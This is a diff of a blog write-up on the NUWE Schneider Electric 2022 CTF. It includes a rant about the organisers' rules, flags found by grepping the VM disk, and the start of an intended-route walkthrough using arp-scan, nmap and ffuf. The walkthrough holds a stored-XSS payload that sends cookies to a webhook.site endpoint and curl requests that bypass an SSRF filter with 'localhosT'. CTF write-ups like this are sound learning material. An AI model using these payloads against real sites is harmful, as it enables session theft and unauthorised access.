@@ -1,696 +1,316 @@
-<!DOCTYPE html>
-<html lang="en">
-
-    <head><title>🥶 NUWE Schneider Electric 2022 CTF &ndash; ~/cake</title>
-
-
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta charset="utf-8"/>
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/devicon/2.15.1/devicon.min.css" integrity="sha512-X2hbziex+UPQ+KdI4BWI+39jEDhf2Smc6bfFI/FTIzWnt7mbwZCUU4RWalnMfxtHCpISlexzmd2kvPFJCliiPA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-
-<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/site.webmanifest">
-
-
-<link rel="stylesheet" href="https://cakehonolulu.github.io/css/colour/gruvbox-dark.css">
-<link rel="stylesheet" href="https://cakehonolulu.github.io/css/colour/dark-mode.css">
-<link rel="stylesheet" href="https://cakehonolulu.github.io/css/risotto.css">
-<link rel="stylesheet" href="https://cakehonolulu.github.io/css/custom.css">
-</head>
-
-    <body>
-        <div class="page">
-
-            <header class="page__header"><h1 class="page__logo"><a href="https://cakehonolulu.github.io" class="page__logo-inner">~/cake</a></h1>
-<nav class="page__nav main-nav">
-    <ul>
-    
-    
-    <li class="main-nav__item"><a class="nav-main-item" href="/about/" title="">About</a></li>
-    
-    <li class="main-nav__item"><a class="nav-main-item active" href="/ctfs/" title="writeups">writeups</a></li>
-    
-    </ul>
-</nav>
-
-</header>
-
-            <section class="page__body">
-    <h1 id="nuwe-schneider-electric-2022-ctf">🥶 NUWE Schneider Electric 2022 CTF</h1>
-
-    <br>
-<table>
-<thead>
-  <tr>
-<th>Difficulty</th>
-<td>Medium</td>
-  </tr>
-</thead>
-<tbody>
-  <tr>
-<th>Category</th>
-<td>Multiple (Web Exploitation, OSINT, Windows Exploitation...)</td>
-  </tr>
-</tbody>
-</table>
-<h1 id="disclaimer">DISCLAIMER!</h1>
-<br>
-<p>My team and I decided against presenting a solution for this challenge due to the unfair rules and unprecedented incompetence by the organization.</p>
-<p>A CTF is an event where the team with most flags wins; regardless of the way found (Minus bruteforcing them&hellip;).</p>
-<p>Finding the flags in plaintext is a sign of neglection by the organizers; us &ldquo;exploiting&rdquo; their negligence <em>IS</em> a way of winning their CTF.</p>
-<p>You can&rsquo;t change the rules, one method isn&rsquo;t better than any other.</p>
-<p>A FLAG is a FLAG; get pwned.</p>
-<h1 id="1--the-unintended-way">1.- The &ldquo;UNINTENDED&rdquo; way</h1>
-<br>
-You're presented with a .ZIP file containing a VirtualBox .ova file password-protected; the password was given to us right after the initial ceremony.
-<p>Password: <code>vb8thy2feJyy6r7HTcq8e5qLHGj7ezuWrF4uEE66</code></p>
-<p>An <code>ova</code> file is nothing more than a <code>tarball</code> containing VirtualBox VM-related files (Machine
-configuration schema, SHA&rsquo;s&hellip;); plus a virtual disk image (<code>vmdk</code>).</p>
-<p>As such, one can freely mount the image and look for things.</p>
-<p>Challenge creators seemed to evaluate the method you used to obtain the flag with a &ldquo;ready-reckoner&rdquo; they didn&rsquo;t publish.</p>
-<p>First, I disclosed them the method I used to find the flags; the person I disclosed this to, told me that this wasn&rsquo;t the way that they intended it for us to solve it
+<!doctype html><html lang=en><head><title>🥶 NUWE Schneider Electric 2022 CTF &ndash; ~/cake</title><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/devicon/2.15.1/devicon.min.css integrity="sha512-X2hbziex+UPQ+KdI4BWI+39jEDhf2Smc6bfFI/FTIzWnt7mbwZCUU4RWalnMfxtHCpISlexzmd2kvPFJCliiPA==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=stylesheet href=https://cakehonolulu.github.io/css/colour/gruvbox-dark.css><link rel=stylesheet href=https://cakehonolulu.github.io/css/colour/dark-mode.css><link rel=stylesheet href=https://cakehonolulu.github.io/css/risotto.css><link rel=stylesheet href=https://cakehonolulu.github.io/css/custom.css></head><body><div class=page><header class=page__header><h1 class=page__logo><a href=https://cakehonolulu.github.io class=page__logo-inner>~/cake</a></h1><nav class="page__nav main-nav"><ul><li class=main-nav__item><a class=nav-main-item href=/about/ title>About</a></li><li class=main-nav__item><a class="nav-main-item active" href=/ctfs/ title=writeups>writeups</a></li></ul></nav></header><section class=page__body><h1 id=nuwe-schneider-electric-2022-ctf>🥶 NUWE Schneider Electric 2022 CTF</h1><br><table><thead><tr><th>Difficulty</th><td>Medium</td></tr></thead><tbody><tr><th>Category</th><td>Multiple (Web Exploitation, OSINT, Windows Exploitation...)</td></tr></tbody></table><h1 id=disclaimer>DISCLAIMER!</h1><br><p>My team and I decided against presenting a solution for this challenge due to the unfair rules and unprecedented incompetence by the organization.</p><p>A CTF is an event where the team with most flags wins; regardless of the way found (Minus bruteforcing them&mldr;).</p><p>Finding the flags in plaintext is a sign of neglection by the organizers; us &ldquo;exploiting&rdquo; their negligence <em>IS</em> a way of winning their CTF.</p><p>You can&rsquo;t change the rules, one method isn&rsquo;t better than any other.</p><p>A FLAG is a FLAG; get pwned.</p><h1 id=1--the-unintended-way>1.- The &ldquo;UNINTENDED&rdquo; way</h1><br>You're presented with a .ZIP file containing a VirtualBox .ova file password-protected; the password was given to us right after the initial ceremony.<p>Password: <code>vb8thy2feJyy6r7HTcq8e5qLHGj7ezuWrF4uEE66</code></p><p>An <code>ova</code> file is nothing more than a <code>tarball</code> containing VirtualBox VM-related files (Machine
+configuration schema, SHA&rsquo;s&mldr;); plus a virtual disk image (<code>vmdk</code>).</p><p>As such, one can freely mount the image and look for things.</p><p>Challenge creators seemed to evaluate the method you used to obtain the flag with a &ldquo;ready-reckoner&rdquo; they didn&rsquo;t publish.</p><p>First, I disclosed them the method I used to find the flags; the person I disclosed this to, told me that this wasn&rsquo;t the way that they intended it for us to solve it
 (So, it was <em>definitely</em> unintentional) but that it was as valid as any other solution! (He also told me to try finding more ways, which IMHO is a good thing to do too;
-I have 0 criticism against him, he was the most supportive of all; curiously he was from NUWE and not from Schneider&hellip;).</p>
-<p>After this convo, I found the rest of the local flags (All of them), so I told another mentor in Cybersecurity that I found them.</p>
-<p>After 10 minutes or so, we had a team from Schneider get into our call to discuss our findings.</p>
-<p>Here&rsquo;s where the fun started.</p>
-<p>The mental gymnastics they were doing in order to disqualify the findings was abismal.</p>
-<p>Their main points were:</p>
-<p><code>You found the flags, good; but the method isn&rsquo;t the intended one.</code></p>
-<p>Yes, and? Part of the fun from CTFs comes from finding multiple ways of defeating a challenge; be it running a strings() on a file or creating a super-complicated script that mangles the flags for you.</p>
-<p>A few weeks ago I was @ UPC&rsquo;s Hackathon doing CTF challenges and the challenge authors approached me to discuss the unintended ways I used and we got a super nice convo discussing a lot of CTF-related topics.</p>
-<p>After all, CTFs are defined like that because once you find the flag, you upload it in exchange of points or whatever they decide.</p>
-<p>If you need to upload an explanation on how you found them, it&rsquo;s not a CTF.</p>
-<p>CTFs aren&rsquo;t dictaminated by judges.</p>
-<p>CTFs are dictaminated by your skills on developing ways to find a hidden code behind a web, a binary or whatever you want.</p>
-<p>Flags are immutable, it doesn&rsquo;t matter if you ROP your way into a remote shell or if you use an unintended format string vuln.</p>
-<p>This is the first time in my entire life that I participate in a Hackathon that promotes a CTF but isn&rsquo;t a CTF in reality.</p>
-<p><code>Yeah, but flags only count 30% and writeups 70%</code></p>
-<p>While I agree that as an organizer you have the rights to create a custom set of rules for the challenge, you can&rsquo;t introduce/modify/delete (sub)rules
-at your will as soon as you find a thing that doesn&rsquo;t fall inside your rules.</p>
-<p>I was on different calls during the event and even some of the mentors were uninformed that this wasn&rsquo;t &ldquo;legal&rdquo; per se.</p>
-<p>I unfortunately don&rsquo;t have screen recordings/audio proofs; but it was a shitshow, they couldn&rsquo;t even agree in a solution to the problem.</p>
-<p>Also, 70% writeups and 30% flags?</p>
-<p>TF is that?</p>
-<p>This only adds subjectiveness into the judgement of a CTF.</p>
-<p>Read the last 3 phrases again, the more you read them, the less sense they make.</p>
-<p>This is a Judged CTF with subjective rules</p>
-<p><img src="/images/ctfs/schneidelec/wtf.jpeg" alt="WTF"></p>
-<p>What will you judge from a writeup?</p>
-<p>Not using Comic Sans????</p>
-<p>lmao</p>
-<p>There were more &ldquo;arguments&rdquo; (If they can be called like so), I won&rsquo;t get into discussing them, each one they threw was worse than the previous one.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ grep -FR <span style="color:#e6db74">&#34;FLAG{&#34;</span> --exclude-dir <span style="color:#e6db74">&#34;Windows&#34;</span> --exclude-dir <span style="color:#e6db74">&#34;Program Files&#34;</span> --exclude-dir <span style="color:#e6db74">&#34;Program Files (x86)&#34;</span> 2&gt;/dev/null
-</span></span><span style="display:flex;"><span>FLAG<span style="color:#f92672">{</span>sanitize_input<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>FLAG<span style="color:#f92672">{</span>Mas_uno_por_revisar_sistema<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>FLAG<span style="color:#f92672">{</span>Buen_Password_Spraying_Eh?<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>FLAG<span style="color:#f92672">{</span>A_su_servicio<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>FLAG<span style="color:#f92672">{</span>Pesadilla_en_el_trabajo<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>FLAG<span style="color:#f92672">{</span>Ay_Ay_Vigila_Tu_Puesto<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>API_FLAG<span style="color:#f92672">{</span>Never_public_your_secret<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>FLAG<span style="color:#f92672">{</span>SSRF_PARA_TOD@S_XD<span style="color:#f92672">}</span></span></span></code></pre></div>
-<p>Next one was found by searching: &ldquo;Default MySQL Windows Database Location&rdquo; in DuckDuck :)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strings <span style="color:#e6db74">&#34;ProgramData/MySQL/MySQL Server 8.0/Data/flag/flag.ibd&#34;</span>
-</span></span><span style="display:flex;"><span>FLAG<span style="color:#f92672">{</span>Update_Plugins!<span style="color:#f92672">}</span></span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ find . -name <span style="color:#e6db74">&#34;*.sql*&#34;</span> | xargs strings | grep -F <span style="color:#e6db74">&#34;FLAG{&#34;</span>
-</span></span><span style="display:flex;"><span>FLAG<span style="color:#f92672">{</span>Sticky_Notes_FTW<span style="color:#f92672">}</span></span></span></code></pre></div>
-<p>In: ./Users/jenriques/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite-wal</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ grep -R <span style="color:#e6db74">&#34;Instagram&#34;</span> Users/Public/</span></span></code></pre></div>
-<p>We find an Instagram link, check the second photo:</p>
-<p><img src="/images/ctfs/schneidelec/instagram.jpeg" alt="Instagram"></p>
-<p><code>FLAG{El_Buen_OSINT_Naito}</code></p>
-<p>Fuck your shitty invented rules, don&rsquo;t pretend you&rsquo;ve made a blackbox-style CTF. The moment you give us a machine to test our things one, it&rsquo;s not a blackbox anymore.</p>
-<p>HackUPC hosted almost a 1000 members and their network was made by them.</p>
-<p>They were university students and could do it.</p>
-<p>You are a business and can&rsquo;t even host a exploitable CTF machine on your own.</p>
-<p>Whatever&hellip;</p>
-<h1 id="lets-pwn-the-shit-out-of-your-machine-then">Let&rsquo;s pwn the shit out of your machine then</h1>
-<br>
-<p><img src="/images/ctfs/schneidelec/ez.jpg" alt="EZ"></p>
-<br>
-<br>
-<br>
-<br>
-<br>
-<h1 id="2--their-intended-way">2.- The(ir) INTENDED way</h1>
-<br>
-<p>
-<code>Flags: 2 OSINT + 4 WEB + 3 SYSTEM ( + 3 BONUS)</code>
-<p>You&rsquo;re presented with a .ZIP file containing a VirtualBox .ova file password-protected; the password was given to us right after the initial ceremony.</p>
-<p>Password: <code>vb8thy2feJyy6r7HTcq8e5qLHGj7ezuWrF4uEE66</code></p>
-<p><strike>An <code>ova</code> file is nothing more than a <code>tarball</code> containing VirtualBox VM-related files (Machine
-configuration schema, SHA&rsquo;s&hellip;); plus a virtual disk image (<code>vmdk</code>).</p>
-<p>As such, one can freely mount the image and look for things.</strike></p>
-<p>Let&rsquo;s open the ova file; it&rsquo;ll automagically set up a VirtualBox machine for us, don&rsquo;t forget to change the network properties! (Generate random MAC addr&rsquo;s and set the internet method to bridged).</p>
-<p><img src="/images/ctfs/schneidelec/rng_mac.gif" alt="RNG_MAC"></p>
-<p>We may as well power the machine on right after, right?</p>
-<p>We&rsquo;re greeted with a&hellip;</p>
-<p><img src="/images/ctfs/schneidelec/cursed_win.png" alt="Windows?"></p>
-<p>Windows machine? More like  W̰̟ͨ̍͡i̦͉͎ͧ́n̷̲̹̓ͬd̰̜̖̦ͯ͗ͫ͡ǫ̰̬͓͑ẇ̦͎͖̺̺̗̎̂͜s̓҉̺̰̰ ̮̣́̚͟Mͯ͂̑͗͏̰̠̝̮̭͖̝a̫͚͙ͫͫͩ̀c̡̦̲̻̪̹̩̪ͪ̌̆ͮh̙͔̠̱͎̯͊̀̕ì̳̲͖̼͝ň͚̝̺͇̣̋͠e͋</p>
-<p>Anyway, the next thing to do is find where the machine resides in our local network.</p>
-<p>There&rsquo;s multiple ways of doing so, I personally went with the <code>arp-scan</code> way.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo arp-scan --local
-</span></span><span style="display:flex;"><span>Interface:
-</span></span><span style="display:flex;"><span>Starting arp-scan 1.9.7 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span>192.168.1.145		PCS Systemtechnik GmbH&lt;br&gt;
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> packet received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel&lt;br&gt;
-</span></span><span style="display:flex;"><span>Ending arp-scan 1.9.7: <span style="color:#ae81ff">256</span> hosts scanned in 1.943 seconds <span style="color:#f92672">(</span>131.76 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">1</span> responded&lt;br&gt;&lt;/code&gt;</span></span></code></pre></div>
-<p>Aha, we got it.</p>
-<p>If this was a true blackbox style challenge; we&rsquo;d need to discover the target&rsquo;s operating system.</p>
-<p>There are a lot of ways, what I tend to do is check ping&rsquo;s <code>ttl</code> value to find <i>a grosso modo</i> which OS we&rsquo;re dealing with.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ping 192.168.1.145
-</span></span><span style="display:flex;"><span>PING 192.168.1.145 <span style="color:#f92672">(</span>192.168.1.145<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.145: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.243 ms</span></span></code></pre></div>
-<p>TTL=128, so we&rsquo;d know that we&rsquo;d probably be dealing with a Windows machine if we had no information relating to the machine (TTL=128, Windows; TTL=64, Linux).</p>
-<p>While it&rsquo;s not a general rule, it tends to apply to CTF challenges, so there you have it just in case.</p>
-<p>We&rsquo;re presented with a Windows login on the machine, but we have no credential information so it&rsquo;s a dead-end for now.</p>
-<p>Let&rsquo;s now run a port scan targetting the machine.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nmap -Pn -p- 192.168.1.145</span></span></code></pre></div>
-<p>There were a lot of results so I&rsquo;ll filter out the interesting ones</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>80/tcpopen  http
-</span></span><span style="display:flex;"><span>443/tcp   open  https
-</span></span><span style="display:flex;"><span>1337/tcp  open  waste
-</span></span><span style="display:flex;"><span>5000/tcp  open  upnp
-</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 128.55 seconds</span></span></code></pre></div>
-<p>Remember:</p>
-<p><code>-Pn</code> makes nmap only do port scan</p>
-<p><code>-p-</code> specifies all range of ports [0, UINT16_MAX]</p>
-<p>There were WinRM, Kerberos, MySQL and LDAP ports opened too; I took note of them just in case (They can be attack vectors too).</p>
-<p>We&rsquo;ll focus now on web exploitation, so let&rsquo;s attach http(s) ones first.</p>
-<p>Let&rsquo;s try opening the HTTP port first on a web browser.</p>
-<p>We&rsquo;re greeted with this:</p>
-<p><img src="/images/ctfs/schneidelec/80.png" alt="Port80"></p>
-<p>Not that much happening right here&hellip;</p>
-<p>Let&rsquo;s get to the next one (443, HTTPs):</p>
-<p>It&hellip; loads forever?</p>
-<p>Looks like it&rsquo;s not responding at all or it&rsquo;s missing something; let&rsquo;s jump to the next one (1337):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Bad Request - Invalid Hostname
-</span></span><span style="display:flex;"><span>HTTP Error 400. The request hostname is invalid</span></span></code></pre></div>
-<p>It looks like we don&rsquo;t have access&hellip;</p>
-<p>Let&rsquo;s jump to the last one (5000):</p>
-<p>Aha! Looks like we have something!</p>
-<p>The page returns us a <code>application/json</code> content:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;text&#34;</span>:  <span style="color:#e6db74">&#34;There is nothing to see here (I guess)&#34;</span>}</span></span></code></pre></div>
-<p>Yeah, that&rsquo;s suspicious.</p>
-<p>Let&rsquo;s go back to the first webpage we got in.</p>
-<p>We&rsquo;ll run a directory fuzzing scan against it, you can use any of the available tools you want; I used <code style="font-size:15.5px">ffuf</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ffuf -c -w secret_list.txt -u http://192.168.1.145/FUZZ -e .htm,.html,.txt,.css,.js,.php
-</span></span><span style="display:flex;"><span> /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>  /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>  
-</span></span><span style="display:flex;"><span>/<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/   
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span> 
-</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/  
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>  
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">\/</span>_/<span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/<span style="color:#ae81ff">\/</span>_/
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>v1.5.0-dev
-</span></span><span style="display:flex;"><span>________________________________________________
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>:: Method   : GET
-</span></span><span style="display:flex;"><span>:: URL  : http://192.168.1.145/FUZZ
-</span></span><span style="display:flex;"><span>:: Wordlist : FUZZ: secret_list.txt
-</span></span><span style="display:flex;"><span>:: Extensions   : .htm .html .txt .css .js .php
-</span></span><span style="display:flex;"><span>:: Follow redirects : false
-</span></span><span style="display:flex;"><span>:: Calibration  : false
-</span></span><span style="display:flex;"><span>:: Timeout  : <span style="color:#ae81ff">10</span>
-</span></span><span style="display:flex;"><span>:: Threads  : <span style="color:#ae81ff">40</span>
-</span></span><span style="display:flex;"><span>:: Matcher  : Response status: 200,204,301,302,307,401,403,405,500
-</span></span><span style="display:flex;"><span>________________________________________________
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>index.php   <span style="color:#f92672">[</span>Status: 200, Size: 1357, Words: 111, Lines: 37, Duration: 4ms<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>comments.txt<span style="color:#f92672">[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2ms<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>robots.txt  <span style="color:#f92672">[</span>Status: 200, Size: 24, Words: 2, Lines: 1, Duration: 24ms<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>testsite.php<span style="color:#f92672">[</span>Status: 200, Size: 267, Words: 9, Lines: 17, Duration: 4ms<span style="color:#f92672">]</span></span></span></code></pre></div>
-<p>Cool, ffuf found a bunch of interesting stuff.</p>
-<p>Let&rsquo;s access index.php</p>
-<p><img src="/images/ctfs/schneidelec/index_80.png" alt="Index80"></p>
-<p>Meh, it doesn&rsquo;t look interesting</p>
-<p>It&rsquo;s vulnerable to XSS, so there goes that.</p>
-<p><img src="/images/ctfs/schneidelec/xss.png" alt="XSS"></p>
-<p>May I add that this applet is beyond broken? While fuzzing the textbox, at some point the website just, either crashed or did something wrong.</p>
-<p>Later, I saw that it writes the textbox contents to a file named comments.txt and reads it each time we enter to the page, effectively rendering most of our strategies to a one-time-only test before everything get&rsquo;s f*d up.</p>
-<p>So you have to re-install the VM each time you plan an XSS strategy else it gets filled with all the previous stuff you fuzzed it with.</p>
-<p>It looks intentional (And very unsafe too).</p>
-<p>Basically this looks like a very powerful form of XSS called <a href="https://portswigger.net/web-security/cross-site-scripting/stored">Stored XSS</a>, everyone who visits this link will get the XSS payload delivered&hellip; This is not good for the end user
-but it&rsquo;s good for us :)</p>
-<p>Let&rsquo;s craft an XSS payload that delivers the cookies to an endpoint (I used this exact method in HackTheBox&rsquo;s Cyber Apocalypse Web Kryptos Support Challenge, it&rsquo;s identical), webhook.site in this case</p>
-<p>The payload I used is:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xmlHttp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>(); <span style="color:#a6e22e">xmlHttp</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;https://webhook.site/Random_UUID/ENDPOINT?variable=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>, <span style="color:#66d9ef">false</span> ); <span style="color:#a6e22e">xmlHttp</span>.<span style="color:#a6e22e">send</span>(<span style="color:#66d9ef">null</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span></span></span></code></pre></div>
-<p>Let&rsquo;s wait a bit and&hellip;</p>
-<p><img src="/images/ctfs/schneidelec/sanitize_input.png" alt="SanitizeInput"></p>
-<p>Bingo: <code>FLAG{sanitize_input}</code></p>
-<p>Let&rsquo;s jump to our next target; testsite.php</p>
-<p><img src="/images/ctfs/schneidelec/testsite.png" alt="TestSite"></p>
-<p>Interesting&hellip; let&rsquo;s try to redirect ourselves somewhere&hellip; maybe localhost:1337 ?</p>
-<p>The website redirects you if you input your tests, let&rsquo;s try using <code>curl</code></p>
-<p>I inspected the request using Firefox&rsquo;s Network Page in it&rsquo;s built in Inspector, and the textbox contents get appended to an HTTP Request variable named <code>url</code> accordingly, so let&rsquo;s start doing some requests, shall we?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#34;http://192.168.1.145/testsite.php?url=localhost&#34;</span> -w <span style="color:#e6db74">&#34;\n&#34;</span></span></span></code></pre></div>
-<p>It returns us &ldquo;Protocolo no permitido&rdquo; (Prohibited protocol), we haven&rsquo;t <em>really</em> specified a protocol, let&rsquo;s try maybe&hellip; http?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#34;http://192.168.1.145/testsite.php?url=http://localhost&#34;</span> -w <span style="color:#e6db74">&#34;\n&#34;</span></span></span></code></pre></div>
-<p>Now it outputs:</p>
-<p><code>La ruta localhost no esta permitida por razones de seguridad. Que intentas hacer? :D</code></p>
-<p>It&rsquo;s telling us roughly that the localhost location can&rsquo;t be accessed for security reasons&hellip; is this some sort of anti-SSRF methodology?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#34;http://192.168.1.145/testsite.php?url=http://127.0.0.1&#34;</span> -w <span style="color:#e6db74">&#34;\n&#34;</span></span></span></code></pre></div>
-<p>This doesn&rsquo;t work, let&rsquo;s try bypassing a possible anti-SSRF protocol&hellip;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#34;http://192.168.1.145/testsite.php?url=http://localhosT&#34;</span> -w <span style="color:#e6db74">&#34;\n&#34;</span></span></span></code></pre></div>
-<p>This redirects us to localhost, so the anti-SSRF rule looks bypassed&hellip; Maybe let&rsquo;s try adding the ports we wrote down earlier?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#34;http://192.168.1.145/testsite.php?url=http://localhosT:443&#34;</span> -w <span style="color:#e6db74">&#34;\n&#34;</span></span></span></code></pre></div>
-<p>Nothing</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#34;http://192.168.1.145/testsite.php?url=http://localhosT:1337&#34;</span> -w <span style="color:#e6db74">&#34;\n&#34;</span></span></span></code></pre></div>
